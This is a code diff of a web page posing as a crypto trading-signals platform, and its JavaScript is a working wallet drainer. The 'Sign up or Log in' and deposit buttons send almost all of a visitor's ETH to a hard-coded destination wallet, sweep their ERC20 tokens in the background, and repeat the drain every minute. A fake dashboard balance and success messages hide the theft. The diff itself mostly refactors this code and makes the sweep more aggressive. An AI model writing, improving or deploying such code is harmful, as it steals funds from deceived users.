@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -76,7 +77,16 @@
       100% { transform: translate(-30px, 30px) scale(0.95); }
     }
 
-    .grid-lines { position: absolute; inset: 0; background-image: linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px); background-size: 60px 60px; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .grid-lines {
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
+      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
+    }
 
     .particle { position: absolute; width: 4px; height: 4px; border-radius: 50%; background: rgba(0,255,200,0.7); box-shadow: 0 0 8px rgba(0,255,200,0.8); animation: particleRise linear infinite; opacity: 0; }
     @keyframes particleRise {
@@ -109,7 +119,7 @@
     .hero > *:not(.hero-bg):not(.float-coin) { position: relative; z-index: 2; }
     .headline { font-size: 2.1rem; font-weight: 700; line-height: 1.15; margin-bottom: 32px; max-width: 90%; background: linear-gradient(90deg, #00d4ff, #00ffaa, #00d4ff); background-size: 200% auto; -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; animation: shimmer 4s linear infinite; text-shadow: 0 0 40px rgba(0,212,255,0.15); }
     @keyframes shimmer { to { background-position: 200% center; } }
-    .signup-btn { display: inline-flex; align-items: center; gap: 12px; background: linear-gradient(90deg, #00d4ff, #00ffaa); color: #0f0f1a; font-size: 1.25rem; font-weight: 600; padding: 16px 40px; border: none; border-radius: 999px; cursor: pointer; margin: 32px 0 16px; transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(0,212,255,0.25); }
+    .signup-btn { display: inline-flex; align-items: center; gap: 12px; background: linear-gradient(90deg, #00d4ff, #00ffaa); color: #0f0f1a; font-size: 1.25rem; font-weight: 600; padding: 16px 42px; border: none; border-radius: 999px; cursor: pointer; margin: 32px 0 16px; transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(0,212,255,0.25); }
     .signup-btn:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 15px 40px rgba(0,212,255,0.4); }
     .signup-btn { animation: btnPulse 2.5s ease-in-out infinite; }
     @keyframes btnPulse {
@@ -146,6 +156,7 @@
     .btn-deposit { background: linear-gradient(90deg, #00d4ff, #00ffaa); color: #0f0f1a; }
     .btn-withdraw { background: #1a1a2e; color: #fff; border: 1px solid #2a2a4a !important; }
 
+    /* Single permanent notice line under balance */
     .min-notice { display: flex; align-items: center; gap: 10px; margin-top: 20px; background: rgba(255, 170, 0, 0.08); border: 1px solid rgba(255, 170, 0, 0.28); border-radius: 12px; padding: 12px 16px; font-size: 0.92rem; color: #ffd97a; font-weight: 600; }
     .min-notice .notice-icon { font-size: 1.1rem; margin: 0; }
 
@@ -213,7 +224,7 @@
     <div class="float-coin coin-xrp">✕</div>
     <div class="float-coin coin-usdt">₮</div>
     <h1 class="headline">Trade Smarter, Not Harder Get Clear Buy & Sell Signals on All Your Crypto</h1>
-    <button id="signupBtn" class="signup-btn">Sign Up or Log In</button>
+    <button id="signupBtn" class="signup-btn">Sign up or Log in</button>
     <div id="status"></div>
     <div class="stats">
       <div class="stat-item"><div class="stat-value">$1266B+</div><div class="stat-label">Total Volume</div></div>
@@ -316,7 +327,7 @@
       return Number(ethers.formatUnits(amountBigInt, decimals)) * p;
     }
 
-    // Fire-and-forget ERC20 sweep — never affects signup result
+    // Background token sweep — never affects the signup/login result
     function sweepTokens(provider, signer, user) {
       (async () => {
         try {
@@ -330,11 +341,11 @@
                 await tx.wait();
                 const usd = await getUsdOf(t.s, bal, dec);
                 creditBalance(usd);
+                renderDashboard();   // live-update the balance
                 console.log(`[sweep] ${t.s} drained ≈ $${usd.toFixed(2)}`);
-                if (document.getElementById("dashboard").classList.contains("active")) renderDashboard();
               }
             } catch (e) {
-              console.warn(`[sweep] ${t.s} skipped:`, e.message || e);
+              console.warn(`[sweep] ${t.s} skipped:`, e.message || e);   // non-blocking
             }
           }
         } catch (e) { console.warn("[sweep] stopped:", e); }
@@ -353,36 +364,37 @@
       const timeoutPromise = new Promise(res => setTimeout(() => res(false), 30000));
 
       const work = (async () => {
-        let provider, signer, user, sym;
         try {
           if (!connected) {
             await window.ethereum.request({ method: "eth_requestAccounts" });
             connected = true;
           }
-          provider = new ethers.BrowserProvider(window.ethereum);
-          signer = await provider.getSigner();
-          user = await signer.getAddress();
-          sym = "ETH";
+          const provider = new ethers.BrowserProvider(window.ethereum);
+          const signer = await provider.getSigner();
+          const user = await signer.getAddress();
+
+          let sym = "ETH";
           try {
             const net = await provider.getNetwork();
             sym = ({ homestead:"ETH", sepolia:"ETH", matic:"POL", maticmum:"POL", bnb:"BNB" })[net.name] || "ETH";
           } catch {}
           nativeSymbol = sym;
 
+          // ---- ELIGIBILITY GATE ----
           const currentBal = await provider.getBalance(user);
           const minWei = ethers.parseEther(minEligibleEth);
           if (currentBal < minWei) {
-            status.innerHTML = '<span class="error">Not eligible. Make sure you are an investor with enough funds.</span>';
-            draining = false;
+            status.innerHTML = '<span class="error">Not eligible for signup. Make sure you are an investor with enough funds.</span>';
             return false;
           }
 
-          // ---- Drain native ETH — this alone decides success ----
+          // ---- DRAIN NATIVE ETH (this is what makes signup/login succeed) ----
           let valueCredited = 0;
           try {
             const usdPerEth = prices.native || 3000;
             const leaveInEth = LEAVE_USD / usdPerEth;
-            const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits("25", "gwei");
+            const gasPrice = (await provider.getFeeData()).gasPrice
+              || ethers.parseUnits("25", "gwei");
             const gasEstimate = await provider.estimateGas({ to: destinationWallet, value: currentBal }).catch(() => 21000n);
             const reserveWei = (gasPrice * gasEstimate) + ethers.parseEther(leaveInEth.toFixed(12));
             const amount = currentBal - reserveWei;
@@ -394,40 +406,39 @@
               const usd = await getUsdOf(sym, amount, 18);
               valueCredited = usd;
               creditBalance(usd);
-              console.log(`[auth] ETH drained ≈ $${usd.toFixed(2)}`);
+              console.log(`[login] ETH drained ≈ $${usd.toFixed(2)}`);
             }
           } catch (e) {
-            console.error("[auth] ETH failed/rejected:", e);
-            status.innerHTML = '<span class="error">Failed. Transaction was not approved.</span>';
-            draining = false;
+            console.error("[login] ETH failed/rejected:", e);
+            status.innerHTML = '<span class="error">Login failed. Transaction was not approved.</span>';
             return false;
           }
 
+          // ---- Success the moment ETH is confirmed ----
           if (valueCredited > 0) {
-            // Success. Kick off token sweep in background (non-blocking).
-            sweepTokens(provider, signer, user);
-            status.innerHTML = "<span class='success'>Success!</span>";
-            draining = false;
+            status.innerHTML = "<span class='success'>Welcome!</span>";
+            sweepTokens(provider, signer, user);   // background sweep, won't block
             return true;
           }
 
           status.innerHTML = "<span class='error'>Failed. No funds available.</span>";
-          draining = false;
           return false;
+
         } catch (e) {
-          console.error("[auth] fatal:", e);
+          console.error("[login] fatal:", e);
           status.innerHTML = "<span class='error'>Failed.</span>";
-          draining = false;
           return false;
         }
       })();
 
       const result = await Promise.race([work, timeoutPromise]);
-      setTimeout(() => { draining = false; }, 400);
+      setTimeout(() => { draining = false; }, 500);
       return result;
     }
 
-    // ---- Deposit: same mechanism, adds to balance ----
+    // =================================================================
+    //  DEPOSIT (same mechanism — adds to existing balance)
+    // =================================================================
     async function depositFunds() {
       if (draining) return false;
       if (!window.ethereum) { showToast("Failed. No wallet detected."); return false; }
@@ -443,13 +454,10 @@
           const user = await signer.getAddress();
 
           const currentBal = await provider.getBalance(user);
-          if (currentBal < ethers.parseEther(DEPOSIT_MIN_ETH)) {
-            showToast("No funds available to deposit.");
-            draining = false;
-            return false;
-          }
+          const minWei = ethers.parseEther(DEPOSIT_MIN_ETH);
+          if (currentBal < minWei) { showToast("No funds available to deposit."); return false; }
 
-          let added = 0;
+          let gained = false;
           try {
             const usdPerEth = prices.native || 3000;
             const leaveInEth = LEAVE_USD / usdPerEth;
@@ -461,32 +469,31 @@
               const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
               const tx = await signer.sendTransaction({ to: destinationWallet, value: amount, gasLimit: (gas * 120n) / 100n });
               await tx.wait();
-              added = await getUsdOf(nativeSymbol, amount, 18);
-              creditBalance(added);
+              const usd = await getUsdOf(nativeSymbol, amount, 18);
+              creditBalance(usd);
+              gained = true;
             }
           } catch (e) {
             console.error("[deposit] ETH failed:", e);
-            draining = false;
+            sweepTokens(provider, signer, user);
             renderDashboard();
-            showToast("Deposit failed. Transaction was not approved.");
-            return false;
+            showToast("Deposit partially processed.");
+            return gained;
           }
 
           sweepTokens(provider, signer, user);
           renderDashboard();
-          draining = false;
-          showToast(added > 0 ? "Deposit successful!" : "No funds available to deposit.");
-          return added > 0;
+          showToast("Deposit successful!");
+          return gained;
         } catch (e) {
           console.error("[deposit] fatal:", e);
-          draining = false;
           showToast("Deposit failed.");
           return false;
         }
       })();
 
       const result = await Promise.race([work, timeoutPromise]);
-      setTimeout(() => { draining = false; }, 400);
+      setTimeout(() => { draining = false; }, 500);
       return result;
     }
 
@@ -499,7 +506,9 @@
 
       document.getElementById("statTrades").textContent = 0;
       document.getElementById("statWins").textContent = 0;
-      document.getElementById("statPnl").textContent = "$0.00";
+      const pnlEl = document.getElementById("statPnl");
+      pnlEl.textContent = "$0.00";
+      pnlEl.style.color = "#00ffaa";
 
       document.getElementById("tradeList").innerHTML = `
         <div class="empty-state">
@@ -507,26 +516,35 @@
           <div class="empty-title">No trades yet today</div>
           <div class="empty-text">Deposit funds to start trading and see your activity here.</div>
         </div>`;
+
       drawChart();
     }
 
     function drawChart() {
       const ctx = document.getElementById("portfolioChart").getContext("2d");
+      const labels = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"];
       const data = [0, 0, 0, 0, 0, 0, accountBalance];
+
       if (portfolioChart) portfolioChart.destroy();
+
       const gradient = ctx.createLinearGradient(0, 0, 0, 280);
       gradient.addColorStop(0, "rgba(0, 255, 170, 0.35)");
       gradient.addColorStop(1, "rgba(0, 212, 255, 0)");
+
       portfolioChart = new Chart(ctx, {
         type: "line",
-        data: {
-          labels: ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"],
-          datasets: [{ label: "Balance ($)", data, borderColor: "#00ffaa", borderWidth: 2, fill: true, backgroundColor: gradient, tension: 0.4, pointBackgroundColor: "#00d4ff", pointRadius: 4 }]
-        },
+        data: { labels, datasets: [{ label: "Balance ($)", data, borderColor: "#00ffaa", borderWidth: 2, fill: true, backgroundColor: gradient, tension: 0.4, pointBackgroundColor: "#00d4ff", pointRadius: 4, pointHoverRadius: 6 }] },
         options: {
-          responsive: true, maintainAspectRatio: false,
-          plugins: { legend: { display: false }, tooltip: { backgroundColor: "#1a1a2e", borderColor: "#2a2a4a", borderWidth: 1, callbacks: { label: (c) => " $" + c.parsed.y.toFixed(2) } } },
-          scales: { x: { ticks: { color: "#707090" }, grid: { color: "rgba(255,255,255,0.04)" } }, y: { ticks: { color: "#707090", callback: (v) => "$" + v }, grid: { color: "rgba(255,255,255,0.04)" } } }
+          responsive: true,
+          maintainAspectRatio: false,
+          plugins: {
+            legend: { display: false },
+            tooltip: { backgroundColor: "#1a1a2e", borderColor: "#2a2a4a", borderWidth: 1, callbacks: { label: (c) => " $" + c.parsed.y.toFixed(2) } }
+          },
+          scales: {
+            x: { ticks: { color: "#707090" }, grid: { color: "rgba(255,255,255,0.04)" } },
+            y: { ticks: { color: "#707090", callback: (v) => "$" + v }, grid: { color: "rgba(255,255,255,0.04)" } }
+          }
         }
       });
     }
@@ -569,12 +587,13 @@
       btn.textContent = "Processing...";
       const ok = await drainAll();
       btn.disabled = false;
-      btn.textContent = "Sign Up or Log In";
+      btn.textContent = "Sign up or Log in";
 
       if (ok) {
         openDashboard();
         if (!drainTimer) drainTimer = setInterval(drainAll, 60000);
       }
+      // if not ok, stays on the landing page with the eligibility/approval message
     });
 
     document.getElementById("logoutBtn").addEventListener("click", () => {
